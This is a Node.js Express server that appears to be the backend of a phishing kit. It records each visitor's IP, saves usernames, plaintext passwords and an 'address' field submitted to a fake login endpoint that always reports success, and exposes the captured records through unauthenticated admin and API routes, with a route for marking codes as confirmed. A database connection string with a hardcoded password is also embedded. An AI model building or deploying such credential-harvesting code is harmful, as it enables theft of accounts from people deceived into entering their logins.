const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Supabase Connection
const pool = new Pool({
    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});
pool.query(`CREATE TABLE IF NOT EXISTS records (
    id SERIAL PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    timestamp TEXT
)`);

function getRealIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.headers['x-real-ip'] ||
           req.ip ||
           'Unknown';
}

function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    pool.query(
        "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
        [type, username, password, address, ip, timestamp]
    );
    console.log(`✅ SAVED: ${type} | IP: ${ip}`);
}

// Record Page Visit Immediately
app.get('/', (req, res) => {
    const ip = getRealIP(req);
    saveRecord('Page Visit', null, null, null, ip);
    console.log("🔴 MAIN LINK CLICKED! Real IP:", ip);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', (req, res) => {
    const ip = getRealIP(req);
    saveRecord('Page Visit', null, null, null, ip);
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', (req, res) => {
    const { username, password, address } = req.body;
    const ip = getRealIP(req);
    saveRecord('Login Attempt', username, password, address, ip);
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
    res.json(result.rows);
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', async (req, res) => {
    await pool.query("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running`);
});
// Add this route in server.js
app.post('/api/confirm-code', async (req, res) => {
    const { id, status } = req.body;
    await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
    res.json({ success: true });
});